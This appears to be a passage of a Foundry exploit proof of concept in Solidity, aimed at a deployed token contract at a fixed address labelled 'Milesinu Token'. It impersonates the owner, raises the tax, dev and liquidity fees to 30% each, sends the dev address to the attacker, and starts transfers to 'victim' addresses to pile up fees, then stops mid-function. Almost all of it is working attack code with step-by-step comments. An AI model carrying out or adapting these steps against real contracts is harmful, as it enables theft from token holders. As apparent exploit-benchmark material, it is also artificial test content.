contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x9eFEabD1ae9Fe1e777ebe4D1e271510622b65711;
    address attacker = address(this);
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
        // The test file already defines TARGET and attacker
        vm.label(TARGET, "Milesinu Token");

        // Get the current owner of the contract
        address owner = Milesinu(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Store initial attacker balance for comparison later
        initialBalance = address(attacker).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Impersonate the owner
        address owner = Milesinu(TARGET).owner();
        vm.startPrank(owner);

        // Step 2: Set all fees to 30% (exceeding 25% as hinted)
        Milesinu(TARGET).setTaxFeePercent(30);
        Milesinu(TARGET).setDevFeePercent(30);
        Milesinu(TARGET).setLiquidityFeePercent(30);

        // Step 3: Set DevAddress to attacker
        Milesinu(TARGET).setDevAddress(payable(attacker));

        // Step 4: Enable swapAndLiquify
        Milesinu(TARGET).setSwapAndLiquifyEnabled(true);

        // Step 5: Check current maxTxAmount and set to a reasonable value if needed
        // Default is 500 * 10^6 * 10^9 = 5e17 tokens
        // Let's set it to 10% of total supply to allow reasonable transfers
        Milesinu(TARGET).setMaxTxPercent(10); // 10 * 10^6 * 10^9 = 1e16 tokens

        vm.stopPrank();

        // Step 6: Get some tokens from owner - use a SMALL amount
        // Start with 1% of maxTxAmount to avoid overflow
        uint256 maxTxAmount = 10 * 10**6 * 10**9; // What we just set
        uint256 initialTransfer = maxTxAmount / 100; // 1% of maxTxAmount

        vm.prank(owner);
        Milesinu(TARGET).transfer(attacker, initialTransfer);

        console.log("Attacker received tokens:", initialTransfer);

        // Step 7: Create addresses for transfers
        address victim1 = address(0x123);
        address victim2 = address(0x456);
        address victim3 = address(0x789);

        // Step 8: Perform multiple small transfers to accumulate fees
        // Each transfer will take 90% in fees (30% tax + 30% dev + 30% liquidity)
        // So 90% of each transfer goes to contract as fees

        // First transfer: attacker -> victim1
        uint256 transferAmount = initialTransfer / 10; // Small amount
        vm.prank(attacker);
        Milesinu(TARGET).transfer(victim1, transferAmount);

        console.log("First transfer completed");

        // Check contract balance after first transfer
        uint256 contractBalance = Milesinu(TARGET).balanceOf(TARGET);
